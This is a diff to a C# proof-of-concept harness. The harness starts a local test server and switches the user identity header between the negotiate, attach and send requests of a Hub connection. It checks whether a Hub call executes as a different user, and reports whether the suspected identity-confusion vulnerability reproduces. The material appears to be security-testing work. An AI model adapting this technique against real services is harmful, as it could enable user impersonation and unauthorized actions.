@@ -41,38 +41,59 @@ try
     Console.WriteLine($"Runtime: {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");
 
     var control = await RunScenario(client, address, "Alice", "Alice", "Alice");
-    Console.WriteLine($"CONTROL same identity: {control.Status}; Hub saw: {control.Identity ?? "<none>"}");
+    Print("CONTROL Alice negotiate / Alice attach / Alice send", control);
     if (control.Status != ScenarioStatus.Completed || control.Identity != "Alice")
     {
-        Console.WriteLine($"INCONCLUSIVE: positive control failed. {control.Detail}");
+        Console.WriteLine("INCONCLUSIVE: positive control failed; candidate results are not reliable.");
         Environment.ExitCode = 2;
         return;
     }
 
-    // Target the suspected null-at-negotiate case: anonymous negotiation,
-    // Alice on the first transport attach, then Bob on the send request.
-    var candidate = await RunScenario(client, address, "", "Bob", "Alice");
-    Console.WriteLine($"ANON-NEGOTIATE / ALICE-ATTACH / BOB-SEND: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}");
-    if (candidate.Status == ScenarioStatus.Completed && candidate.Identity == "Bob")
+    // Keep the connection identity stable through negotiation and initial attach.
+    // Change it only on the subsequent POST carrying the Hub invocation.
+    var authenticatedSwitch = await RunScenario(client, address, "Alice", "Bob", "Alice");
+    Print("AUTHENTICATED Alice negotiate / Alice attach / Bob send", authenticatedSwitch);
+
+    // Also test the null-to-authenticated transition after an anonymous attach.
+    var anonymousSwitch = await RunScenario(client, address, "", "Bob", "");
+    Print("ANONYMOUS negotiate / anonymous attach / Bob send", anonymousSwitch);
+
+    // Separate control: identity changes during initial attach, before Hub send.
+    var attachSwitch = await RunScenario(client, address, "Alice", "Alice", "Bob");
+    Print("ATTACH SWITCH Alice negotiate / Bob attach / Alice send", attachSwitch);
+
+    var candidates = new[]
     {
-        Console.WriteLine("VULNERABILITY_REPRODUCED: Hub invocation executed as Bob after anonymous negotiation and Alice attach.");
+        ("authenticated send switch", authenticatedSwitch),
+        ("anonymous send switch", anonymousSwitch),
+        ("initial attach switch", attachSwitch)
+    };
+
+    var reproduced = candidates.FirstOrDefault(x =>
+        x.Item2.Status == ScenarioStatus.Completed && x.Item2.Identity == "Bob");
+    if (reproduced.Item2 is not null)
+    {
+        Console.WriteLine($"VULNERABILITY_REPRODUCED: {reproduced.Item1}; Hub observed Bob.");
         Environment.ExitCode = 0;
     }
-    else if (candidate.Status == ScenarioStatus.Completed)
+    else if (candidates.Any(x => x.Item2.Status == ScenarioStatus.NoCompletion))
     {
-        Console.WriteLine($"NOT_REPRODUCED: Hub observed '{candidate.Identity ?? "<anonymous>"}', not Bob.");
-        Environment.ExitCode = 1;
+        Console.WriteLine("INCONCLUSIVE: at least one candidate did not produce a definitive response.");
+        Environment.ExitCode = 2;
     }
     else
     {
-        Console.WriteLine($"INCONCLUSIVE: candidate did not complete. {candidate.Detail}");
-        Environment.ExitCode = 2;
+        Console.WriteLine("NOT_REPRODUCED: no candidate Hub invocation completed as Bob.");
+        Environment.ExitCode = 1;
     }
 }
 finally
 {
     await app.StopAsync();
 }
+
+static void Print(string label, ScenarioResult result) =>
+    Console.WriteLine($"{label}: {result.Status}; Hub saw: {result.Identity ?? "<none>"}; {result.Detail ?? ""}");
 
 static async Task<ScenarioResult> RunScenario(
     HttpClient client, string baseAddress,
@@ -96,7 +117,8 @@ static async Task<ScenarioResult> RunScenario(
 
     using (var attach = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
     {
-        attach.Headers.Add("X-Test-User", attachIdentity);
+        if (!string.IsNullOrWhiteSpace(attachIdentity))
+            attach.Headers.Add("X-Test-User", attachIdentity);
         using var attachResponse = await client.SendAsync(attach);
         if (!attachResponse.IsSuccessStatusCode)
             return new(ScenarioStatus.Rejected, null, $"Initial attach HTTP {(int)attachResponse.StatusCode}: {await attachResponse.Content.ReadAsStringAsync()}");
@@ -107,7 +129,8 @@ static async Task<ScenarioResult> RunScenario(
                  "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}" + rs;
     using (var send = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
     {
-        send.Headers.Add("X-Test-User", sendIdentity);
+        if (!string.IsNullOrWhiteSpace(sendIdentity))
+            send.Headers.Add("X-Test-User", sendIdentity);
         send.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(frames));
         send.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
         using var sendResponse = await client.SendAsync(send);
@@ -121,7 +144,8 @@ static async Task<ScenarioResult> RunScenario(
     while (DateTime.UtcNow < deadline)
     {
         using var poll = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}");
-        poll.Headers.Add("X-Test-User", attachIdentity);
+        if (!string.IsNullOrWhiteSpace(attachIdentity))
+            poll.Headers.Add("X-Test-User", attachIdentity);
         using var response = await client.SendAsync(poll);
         var body = await response.Content.ReadAsStringAsync();
         if (!response.IsSuccessStatusCode)
